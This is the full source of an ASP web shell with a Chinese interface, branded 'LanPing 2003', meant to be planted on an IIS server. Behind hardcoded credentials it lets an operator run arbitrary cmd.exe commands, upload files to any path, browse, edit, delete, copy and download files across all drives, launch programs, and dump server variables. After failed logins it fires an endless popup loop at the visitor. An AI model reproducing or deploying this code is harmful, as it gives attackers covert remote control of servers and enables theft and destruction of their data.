<%@ LANGUAGE="VBSCRIPT" codepage="936"%>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<style>
body{font-size: 9pt;color: blue}
table{font-family: 宋体;font-size: 9pt}
a{font-family: 宋体;font-size: 9pt;color: blue;text-decoration: none}
a:hover{font-family: 宋体;color: #990000;text-decoration: none}
input {BORDER-RIGHT: #888800 1px solid;BORDER-TOP: #888800 1px solid;
BACKGROUND: #ffffff;BORDER-LEFT: #888800 1px solid;
BORDER-BOTTOM: #888800 1px solid;FONT-FAMILY: "Verdana","Arial"font-color: #ffffff;FONT-SIZE: 9pt;}
</style>
<%
Response.Expires=0
Co=Request.ServerVariables("SCRIPT_NAME")
if session("zh_opt")="zhang1891" then
Session.TimeOut=50
Session(Co)=0
if request("up")=1 then
Server.ScriptTimeOut=3000
%>
<SCRIPT RUNAT=SERVER LANGUAGE="VBSCRIPT">
DIM zh
CLASS zha
dim isForm,isFile

Public function Form(strForm)
strForm=lcase(strForm)
if not isForm.exists(strForm) then
Form=""
else
Form=isForm(strForm)
end if
end function

Public function File(strFile)
strFile=lcase(strFile)
if not isFile.exists(strFile) then
set File=new FileInfo
else
set File=isFile(strFile)
end if
end function

Private Sub CLASS_Initialize 
dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
dim iFindStart,iFindEnd,iFormStart,iFormEnd,sFormName
set isForm=Server.CreateObject("Scripting.Dictionary")
set isFile=Server.CreateObject("Scripting.Dictionary")
if Request.TotalBytes<1 then Exit Sub
set tStream=Server.CreateObject("adodb.stream")
set zh=Server.CreateObject("adodb.stream")
zh.Type=1
zh.Mode=3
zh.Open
zh.Write Request.BinaryRead(Request.TotalBytes)
zh.Position=0
RequestData=zh.Read

iFormStart=1
iFormEnd=LenB(RequestData)
vbCrlf=chrB(13) & chrB(10)
sStart=MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
iStart=LenB (sStart)
iFormStart=iFormStart+iStart+1
while (iFormStart+10)<iFormEnd
iInfoEnd=InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
tStream.Type=1
tStream.Mode=3
tStream.Open
zh.Position=iFormStart
zh.CopyTo tStream,iInfoEnd-iFormStart
tStream.Position=0
tStream.Type=2
tStream.Charset="gb2312"
sInfo=tStream.ReadText
tStream.Close

iFormStart=InStrB(iInfoEnd,RequestData,sStart)
iFindStart=InStr(22,sInfo,"name=""",1)+6
iFindEnd=InStr(iFindStart,sInfo,"""",1)
sFormName=lcase(Mid(sinfo,iFindStart,iFindEnd-iFindStart))

if InStr (45,sInfo,"filename=""",1)>0 then
set theFile=new FileInfo

iFindStart=InStr(iFindEnd,sInfo,"filename=""",1)+10
iFindEnd=InStr(iFindStart,sInfo,"""",1)
sFileName=Mid(sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileName=getFileName(sFileName)
theFile.FilePath=getFilePath(sFileName)

iFindStart=InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
iFindEnd=InStr(iFindStart,sInfo,vbCr)
theFile.FileType=Mid(sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileStart=iInfoEnd
theFile.FileSize=iFormStart-iInfoEnd-3
theFile.FormName=sFormName
if not isFile.Exists(sFormName) then
isFile.add sFormName,theFile
end if
else
tStream.Type=1
tStream.Mode=3
tStream.Open
zh.Position=iInfoEnd
zh.CopyTo tStream,iFormStart-iInfoEnd-3
tStream.Position=0
tStream.Type=2
tStream.Charset="gb2312"
sFormValue=tStream.ReadText
tStream.Close
if isForm.Exists(sFormName) then
isForm(sFormName)=isForm(sFormName)&","&sFormValue
else
isForm.Add sFormName,sFormValue
end if
end if
iFormStart=iFormStart+iStart+1
wend
RequestData=""
set tStream=nothing
End Sub

Private Sub CLASS_Terminate
if Request.TotalBytes>0 then
isForm.RemoveAll
isFile.RemoveAll
set isForm=nothing
set isFile=nothing
zh.Close
set zh=nothing
end if
End Sub
   
Private function GetFilePath(FullPath)
If FullPath<>"" Then
GetFilePath=left(FullPath,InStrRev(FullPath,"\"))
Else
GetFilePath=""
End If
End function

Private function GetFileName(FullPath)
If FullPath<>"" Then
GetFileName=mid(FullPath,InStrRev(FullPath,"\")+1)
Else
GetFileName=""
End If
End function
End CLASS

CLASS FileInfo
dim FormName,FileName,FilePath,FileSize,FileType,FileStart
Private Sub CLASS_Initialize
FileName=""
FilePath=""
FileSize=0
FileStart=0
FormName=""
FileType=""
End Sub
  
Public function SaveAs(FullPath)
dim dr
if FileStart=0 or FileName="" or right(fullpath,1)="\" then exit function
set dr=CreateObject("Adodb.Stream")
dr.Mode=3
dr.Type=1
dr.Open
zh.position=FileStart
zh.copyto dr,FileSize
dr.SaveToFile FullPath,2
dr.Close
set dr=nothing
end function
End CLASS
</SCRIPT>
<%
dim upload,file,formName,formPath
set upload=new zha
formPath=upload.isform("filepath")
if right(formPath,1)<>"\" then formPath=formPath&"\"
for each formName in upload.isFile
set file=upload.isFile(formName)
if file.filesize<1 then
Response.Write "NO file selected<a href=# onclick=history.go(-1)>[RE]</a>"
response.end
end if
file.SaveAs (formPath&file.FileName)
Response.write " up："&formPath&file.FileName&" OK!"
set file=nothing
next
set upload=nothing
response.write "<a href=# onclick=history.go(-1)>[BACK]</a>"
response.end
else
Set tN=Server.CreateObject("WSCRIPT.NETWORK")
dN="\\"&tN.ComputerName&"\"&tN.UserName
if trim(request.form("password"))<>"" and trim(request.form("password"))<>"zhangg" then call out()
if trim(request.form("password"))="zhangg" then
session("password")="zh1891"
response.redirect ""&Co&""
else
if session("password")<>"zh1891" then
call login()
response.end
end if
set fB=CreateObject("Scripting.FileSystemObject")

select case request("id")
case "edit"
call edit()
case "dir"
call dir()
case "down"
call dlf(request("path"))
case"pan"
call pan()
case "out"
call out()
case else
call main()
end select
end if

sub login()
set sa=server.createobject("shell.application")
%>
<center>
<table border=1 width=600 cellspacing=0 cellpadding=0>
<tr bgcolor="#EEEEEE" height=18>
<td width="30%"> 服务器名</td>
<td width="70%"><a href="http://<%=Request.ServerVariables("SERVER_NAME")%>"target=_blank>
 <%=Request.ServerVariables("SERVER_NAME")%></a></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td> 服务器IP : 端口  时间</td>
<td> <%=Request.ServerVariables("LOCAL_ADDR")%> : <font color=red>
<%=Request.ServerVariables("SERVER_PORT")%></font>  <%=now%></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td> 服务器CPU数量 {操作系统}</td>
<td> <%=Request.ServerVariables("NUMBER_OF_PROCESSORS")%> 个 {<%=Request.ServerVariables("OS")%>}</td>
</tr>
<tr bgcolor="#EEEEEE" height=18>
<td><font class=fonts> 局域网地址:</font></td>
<td> <%=dN%></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<%
dim t1,t2,ys,Ttime
t1=timer
for i=1 to 500000
ys= 1 + 1
next
t2=timer
Ttime=cstr(int(((t2-t1)*10000)+0.5)/10)
%>
<td> 服务器运算速度 </td>
<td> <%=Ttime%> 毫秒  (256M 2.4G为156.3毫秒)</td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td> <font color=red>客户端IP: 端口 [无代理]</td>
<td> <font color=red><%=Request.ServerVariables("REMOTE_ADDR")%> : 
<%=Request.ServerVariables("REMOTE_PORT")%> [ 
<%=Request.ServerVariables("HTTP_X_FORWARDED_FOR")%>]</td>
</tr>
<tr bgcolor="#dddddd" height=18>
<td> 本文件绝对路径</td>
<td> <a href=<%=Co%> title=刷新><%=server.mappath(Co)%></a></td>
</tr>
<TR><TD colspan="4" bgcolor="#ffffff">
<form name="form" method="post" action="<%=Co%>?up=1" enctype="multipart/form-data">
 绝对路径:<input type="text" name="filepath" value="<%=Server.MapPath(".")%>"size=86><BR>
 文件:<input type="file" name="file1"size=72> <input type="submit" name="upup" value="上传">
</TD></TR></form></table>
<table><BR>
<form method="POST" action="<%=Co%>">
Pass：<input type="password" name="password" size=12>
<input type=submit name=sb value=发送命令>
<input type=submit name=Submit value=服務器所有变量>
<%=timer%>   
<B>LanPing&copy;2003</B><BR>
复制:<input type=text name=text1 size=38>
 目的路径:<input type=text name=text2 size=40><br>
移动:<input type=text name=text3 size=38>
 目的路径:<input type=text name=text4 size=40><br>
程序:<input type=text name=text5 size=38>
 别加参数:<input type=text name=text6 size=40><br>
浏览:<input type=text name=text size=38>
DOS命令:<input type="text" name="ok" size="41">
</form></table></center>
<hr>
<%
On Error Resume Next
hz=Request.Form("ok")
if hz<>"" then
hz="cmd.exe /c "&hz&""
set zh=server.CreateObject("WScript.Shell")
zh.run ""&hz&"",1,True
response.write "执行 "&hz&" 完成!"
response.end
end if

check=Request.Form("Submit")
if check <>"" then
response.write "<p align=center>服務器端所有变量</p>"
for each name in request.servervariables
response.write "<br><b>"&name&"</br>"
response.write request.servervariables(name)
response.write "<HR>"
next
end if

sz=Request.Form("text")
if (sz <> "") then
if right(sz,1)<>"\" then sz=sz&"\"
set fod1=sa.namespace(sz)
set foditems=fod1.items
for each co in foditems
response.write ""&co.path&"-----"&co.size&"<br>"
next
end if

sz1=Request.Form("text1")
sz2=Request.Form("text2")
if sz1<>"" and sz2<>"" then
set fod1=sa.namespace(sz2)
for i=len(sz1) to 1 step -1
if mid(sz1,i,1)="\" then
path=left(sz1,i-1)
exit for
end if
next
if len(path)=2 then path=path & "\"
path2=right(sz1,len(sz1)-i)
set fod2=sa.namespace(path)
set foditem=fod2.parsename(path2)
fod1.copyhere foditem
response.write "ok!"
end if

sz3=Request.Form("text3")
sz4=Request.Form("text4")
if sz3<>"" and sz4<>"" then
set fod1=sa.namespace(sz4)
for i=len(sz3) to 1 step -1
if mid(sz3,i,1)="\" then
path=left(sz3,i-1)
exit for
end if
next
if len(path)=2 then path=path&"\"
path2=right(sz3,len(sz3)-i)
set fod2=sa.namespace(path)
set foditem=fod2.parsename(path2)
fod1.movehere foditem
response.write "ok!"
end if

sz5=Request.Form("text5")
sz6=Request.Form("text6")
if sz5<>"" and sz6<>"" then
sa.namespace(sz5).items.item(sz6).invokeverb
response.write "ok!"
end if
set sa=Nothing
end sub

sub main()
dim cpath,lpath
if Request("path")="" then
lpath="/"
else
lpath=Request("path")&"/"
end if
if Request("attrib")="true" then
cpath=lpath
attrib="true"
else
cpath=Server.MapPath(lpath)
attrib=""
end if
%>
<script language="JavaScript">
function crfile(ls)
{
if (ls==""){alert("输入文件名!");}
else {window.open("<%=Co%>?id=edit&attrib=<%=request("attrib")%>&creat=yes&path=<%=lpath%>"+ls);}
return false;
}
function crdir(ls)
{
if (ls==""){alert("输入文件名!");}
else {window.open("<%=Co%>?id=dir&attrib=<%=request("attrib")%>&op=creat&path=<%=lpath%>"+ls);}
return false;
}
</script>
<script language="vbscript">
sub rmdir(ls)
if confirm("删除："&ls&"目录?") then
window.open("<%=Co%>?id=dir&path="&ls&"&op=del&attrib=<%=request("attrib")%>")
end if
end sub
sub copyfile(sfile)
dfile=InputBox(""&Chr(13)&Chr(10)&"源文件："&sfile&Chr(13)&Chr(10)&"输入目标文件的文件名:"&Chr(13)&Chr(10)&"许带路径,根据当前路径模式. 绝对路径示例c:/或c:\都可以")
dfile=trim(dfile)
attrib="<%=request("attrib")%>"
if dfile<>"" then
if InStr(dfile,":") or InStr(dfile,"/")=1 then
lp=""
if InStr(dfile,":") and attrib<>"true" then
alert "模式不对"&Chr(13)&Chr(10)&"错误路径：["&dfile&"]"
exit sub
end if
else
lp="<%=lpath%>"
end if
window.open("<%=Co%>?id=edit&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
else
alert"输入文件名！"
end If
end sub
</script>
<TABLE cellSpacing=1 cellPadding=3 width="750" align=center bgColor=#b8b8b8>
<TBODY>
<tr bgcolor="#F5F5F5">
<td height=22 colspan="4"bgcolor="#eeeeee">(物理)
路径 <%=Request.ServerVariables("APPL_PHYSICAL_PATH")%>
本文件: <a href=<%=Co%>?id=out title=退出><%=server.mappath(Co)%></a> 
</td>
</tr>
<TR ><TD height=22 colspan="4"bgcolor="#eeeeee">切换盘符：
<%For Each thing in fB.Drives
Response.write "<a href='"&Co&"?path="&thing.DriveLetter&":&attrib=true'>"&thing.DriveLetter&"盘:</a>&nbsp;"
NEXT%>    局域网地址：
<%=dN%></TD>
</TR>

<TR>
<TD align=center height=22 colspan="4"bgColor=#cccccc>
<font color=red><%=Request.ServerVariables("REMOTE_ADDR")%> :
<%=Request.ServerVariables("REMOTE_PORT")%> [ <%=Request.ServerVariables("HTTP_X_FORWARDED_FOR")%>]</font>
<a href=<%=Co%>?id=pan>磁盘信息</a>
<b>LanPing&copy;2003.10</b>
<%=now%>
</TD></TR>

<TD colspan="4" bgcolor="#ffffff">
<%if Request("attrib")="true" then
response.write "<a href='"&Co&"'><font color='#D00000'>换到相对路径</font></a>"
else
response.write "<a href='"&Co&"?attrib=true'><font color='#D00000'>换到绝对路径</font></a>"
end if
%>
 路径: <%=cpath%>    当前浏览目录:<%=lpath%></TD></TR>

<TR><TD height=22 colspan="4" bgcolor="#eeeeee">
<form name="form1" method="post" action="<%=Co%>">
浏览目录: <input type="text" name="path" size="66" value="c:">
<input type="hidden" name="attrib" value="true">
<input type="submit" name="Submit" value="浏览"> 〖绝对路径,支持局域网地址！〗
</TD></form></TR>

<TR><TD colspan="4" bgcolor="#ffffff">
<form name="form" method="post" action="<%=Co%>?up=1" enctype="multipart/form-data">
〖用绝对路径〗传至服务器已有目录:
<input type="text" name="filepath" value="<%=Server.MapPath(".")%>"size="40">
文件:<input type="file" name="file1"> <input type="submit" name="Submit" value="上传">
</TD></form></TR>

<TR bgColor=#eeeeee><TD height=22 colspan="4">
<form name="newfile" onSubmit="return crfile(newfile.filename.value);">
〖<%=cpath%>〗
<input type="text" name="filename" size="40">
<input type="submit" value="建文件" >
<input type="button" value="建目录"onclick="crdir(newfile.filename.value)">〖新建文件和新建目录不能同名〗
</TD></form></TR>

<TR bgColor=#dddddd><TD width="26%" rowspan="2" valign="top" bgColor=#dddddd>
<%
dim theFolder,theSubFolders
if fB.FolderExists(cpath)then
Set theFolder=fB.GetFolder(cpath)
Set theSubFolders=theFolder.SubFolders
Response.write"<a href='"&Co&"?path="&Request("oldpath")&"&attrib="&attrib&"'><font color='#FF8000'>■</font>↑<font color='ff2222'>上级目录</font></a><br>"
For Each x In theSubFolders
Response.write"<a href='"&Co&"?path="&lpath&x.Name&"&oldpath="&Request("path")&"&attrib="&attrib&"'>└<font color='#FF8000'>■</font>  "&x.Name&"</a> <a href="&chr(34)&"javascript: rmdir('"&lpath&x.Name&"')"&chr(34)&"><font color='#FF8000' >×</font>删除</a><br>"
Next
end if
%>
</TD>
<TD valign="top" width="44%">文件名 （鼠标移到文件名可以查看文件属性）</TD>
<TD valign="top" width="11%">大小（字节）</TD>
<TD valign="top" width="18%">文件操作</TD>
</TR>
<TR><TD height=200 colspan="3" valign="top" bgColor=#ffffff>
<%
dim theFiles
if fB.FolderExists(cpath)then
Set theFolder=fB.GetFolder(cpath)
Set theFiles=theFolder.Files
Response.write"<table  width='100%' border='0' cellspacing='0' cellpadding='2'>"
For Each x In theFiles
if Request("attrib")="true" then
showstring="<a href='"&Co&"?id=down&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank' title='"&"类型"&x.type&chr(10)&"属性"&x.Attributes&chr(10)&"时间："&x.DateLastModified&"'><strong>"&x.Name&"</strong></a>"
else
showstring="<a href='"&lpath&x.Name&"' title='"&"类型"&x.type&chr(10)&"属性"&x.Attributes&chr(10)&"时间："&x.DateLastModified&"'target='_blank'><strong>"&x.Name&"</strong></a>"
end if
Response.write"<tr><td width='50%' style='border-bottom:1 solid #000000;'><font color='#FF8000'>□</font>"&showstring&"</td><td width='8%' style='border-bottom:1 solid #000000;'>"&x.size&"</a></td><td width='20%' style='border-bottom:1 solid #000000;'>&nbsp;<a href='"&Co&"?id=edit&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank'>编辑</a>&nbsp<a href='"&Co&"?id=edit&path="&lpath&x.Name&"&op=del&attrib="&attrib&"' target='_blank'>删除</a>"
if Request("attrib")="true" then Response.write"&nbsp;<a href=# onclick=copyfile('"&lpath&x.Name&"')>复制</a>"
Response.write"</td></tr>"
Next
Response.write"</table>"
end if
%>
</TD></TR></TBODY></TABLE>
<%
end sub

sub pan()
For Each pa in fB.Drives
On Error Resume Next
pa1=pa.AvailableSpace
if pa1/1024/1024<1024 then
pa1=round(pa1/1024/1024*100)/100&" MB"
else
pa1=round(pa1/1024/1024/1024*100)/100&" GB"
end if
pa2=round(pa.TotalSize/1024/1024/1024*100)/100
pa3=pa.DriveType
select case pa3
case 0
pa3="未知"
case 1
pa3="软盘"
case 2
pa3="硬盘"
case 3
pa3="网络"
case 4
pa3="光盘"
case 5
pa3="RAM盘"
end select
Response.write"<a href='"&Co&"?path="&pa.DriveLetter&":&attrib=true'>"
Response.write" "&pa3&" "&pa.DriveLetter&" &nbsp;文件系统:"&pa.FileSystem&" &nbsp;&nbsp;容量&nbsp; "&pa2&" GB &nbsp;&nbsp;&nbsp;可用空间&nbsp;"&pa1&" "&pa.IsReady&" "&pa.Path&" "&pa.RootFolder&" "&pa.SerialNumber&"</a><HR>"
next
Response.end
end sub

sub edit()
if Request("attrib")="true" then
pF=Request("path")
else
pF=server.mappath(Request("path"))
end if

if request("op")="del" then
Set ZF=fB.GetFile(pF)
ZF.Delete True
Response.write "<br><center>删除成功！要刷新才能看到效果.</center>"
else
if request("op")="copy" then
if Request("attrib")="true" then
dsfile=Request("dpath")
else
dsfile=Server.MapPath(Request("dpath"))
end if

Set ZF=fB.GetFile(pF)
ZF.copy dsfile
Response.write "<center><p>源文件："+pF+"</center>"
Response.write "<center><br>目的文件："+dsfile+"</center>"
Response.write "<center><br>复制成功！刷新看效果!</p></center>"
else
if request.form("text")="" then
if Request("creat")<>"yes" then

Set ZF=fB.OpenTextFile(pF,1,False)
this=Server.HTMLEncode(ZF.readall)
ZF.Close
end if
%>
<SCRIPT language=JavaScript>
var i=0;
var ie=(document.all)?1:0;
var ns=(document.layers)?1:0;
function selectCode()
{
if(document.pad.text.value.length>0)
{
document.pad.text.focus();
document.pad.text.select();
}
else alert('无选中内容!')
}
function preview()
{
if(document.pad.text.value.length>0)
{
pr=window.open("","Preview","scrollbars=1,menubar=1,status=1,width=700,height=320,left=50,top=110");
pr.document.write(document.pad.text.value);
}
else alert('无预览内容!')
}
function uncompile()
{
if (document.pad.text.value.length>0)
{
source=unescape(document.pad.text.value);
document.pad.text.value=""+source+"";
	i++;
	alert("代码已编译"+i+"次!");
}
else alert('无待解密代码!')
}
</SCRIPT>
<form method="POST" name=pad action="<%=Co%>?id=edit">
<input type="hidden" name="attrib" value="<%=Request("attrib")%>">
<TABLE cellSpacing=1 cellPadding=3 width="750" align=center bgColor=#b8b8b8 border=0>
<TR><TD height=22 bgcolor="#eeeeee"><div align="center">EDIT</div></TD></TR>
<TR ><TD width="100%" height=22 bgcolor="#ffffff">文件名：
<input type="text" name="path" size="45" value="<%=Request("path")%>"></TD>
</TR>
<TR><TD bgcolor="#eeeeee">
<textarea rows="30" name="text" cols="100%"><%=this%></textarea>
</TD>
</TR>
<TR><TD height=22 bgcolor="#ffffff"><div align="center">
<input type="submit" value="提交" name="B1">
<INPUT name=select onclick=selectCode() type=button value=全选>
<INPUT name=view onclick=preview() type=button value=预览>
<INPUT name=retur onclick=uncompile() type=button value=JAVA解密>
<INPUT name=clear type=reset value=重置>
</div></TD></TR></TABLE></form>
<%
else
Set outfile=fB.CreateTextFile(pF)
outfile.WriteLine Request("text")
outfile.close
Response.write "<center>修改成功！刷新就看到效果!</center>"
end if
end if
end if

end sub
end if

sub dir()

if Request("attrib")="true" then
whichdir=Request("path")
else
whichdir=server.mappath(Request("path"))
end if

if request("op")="del" then
fB.DeleteFolder whichdir,True
Response.write "<center> 删除目录:<b>"&whichdir&"</b></center>"
else
if request("op")="creat"  then
fB.CreateFolder whichdir
Response.write "<center> 新建目录:<b>"&whichdir&"</b></center>"
end if
end if
end sub

function dlf(strFile)
strFilename=Request("path")
Response.Buffer=True
Response.Clear
Set s=Server.CreateObject("ADODB.Stream")
s.Open
s.Type=1
on error resume next
if not fB.FileExists(strFilename) then
strFilename=server.MapPath(strFile)
Response.Write("<h1>出错:</h1>"&strFilename&" 有问题<p>")
Response.End
end if
Set f=fB.GetFile(strFilename)
intFilelength=f.size
s.LoadFromFile(strFilename)
if err then
Response.Write("<h1>Error: </h1>"&err.Description&"<p>")
Response.End
end if
Response.AddHeader "Content-Disposition", "attachment; filename=" & f.name
Response.AddHeader "Content-Length", intFilelength
Response.CharSet="UTF-8"
Response.ContentType="application/octet-stream"
Response.BinaryWrite s.Read
Response.Flush
s.Close
Set s=Nothing
response.end
End Function

function out()
Session.Abandon
response.redirect ""&Co&""
response.end
End Function

else
randomize timer
regjm=int(rnd*8998)+1000
%>
<script language=javascript>
function check()
{
var mjj=document.adm
if(mjj.admid.value.length<=0)
{alert("名字？");
mjj.admid.focus();
return false;}
if(mjj.admpw.value.length<=0)
{alert("密码？");
mjj.admpw.focus();
return false;}
if(mjj.admrz.value.length<=0)
{alert("认证码？");
mjj.admrz.focus();
return false;}
var n1=mjj.admrz.value;
var n2=mjj.admrz1.value;
if(n1!=n2)
{window.alert('认证码: '+n2+'');
mjj.admrz.focus();
return false;}
}
</script>
<table width="320" border="0" cellspacing="0" cellpadding="0" align="center" bgcolor="#61bbd3">
<tr> 
<td height="30" align="center">
<font style="FONT-SIZE: 18pt" color=blue>登录</font>
<%
if request.form("admid")<>"" and trim(request.form("admid"))<>"zhang" then response.write "<B>名字</B>错！"
if request.form("admpw")<>"" and trim(request.form("admpw"))<>"cell" then response.write "	<STRONG><font style='FONT-SIZE: 14pt' color=red>密码错！</font></STRONG>"
if trim(request.form("admid"))="zhang" and trim(request.form("admpw"))="cell" then
session("zh_opt")="zhang1891"
response.redirect ""&Co&""
response.end
else
Session(Co)=Session(Co)+1
if Session(Co)=4 then
response.redirect "http://"&Request.ServerVariables("SERVER_NAME")&""
response.end
end if
if Session(Co)>4 then
Session(Co)=0
response.write"<script language='JavaScript'>while(true){window.open('"&Co&"','','fullscreen=yes,Status=no,scrollbars=no,resizable=no');}</script>"
response.end
end if
%>
</td>
</tr>
<tr valign="top">
<td height="182"align="center">
<form method="post" action="<%=Co%>" name="adm" onsubmit="return check()">
<table width="80%" border="2" cellspacing="0" cellpadding="0">
<tr> 
<td width="24%" align="center">名字:</td>
<td width="76%">
<input type="text" name="admid" class="areatype">
</td>
</tr>
<tr> 
<td width="24%" align="center">密码:</td>
<td width="76%">
<input type="password" name="admpw" class="areatype">
</td>
</tr>
<tr><input type=hidden name="admrz1" value="<%=regjm%>">
<td width="24%" align="center">认证:</td>
<td width="76%">
<input type="password" name="admrz" class="areatype"> <%=regjm%>
</td>
</tr>
<tr align="center">
<td colspan="2" height="60">会话ＩＤ:<%=Session.SessionID%>
<input type="submit" name="Submit" value="登录" class="areatype"> <%=Session(Co)%> 次
</td>
</tr>
</table>
</form><b>LanPing&copy;2003.10</b>
</td>
</tr>
<%end if%>
</table>
<%end if%>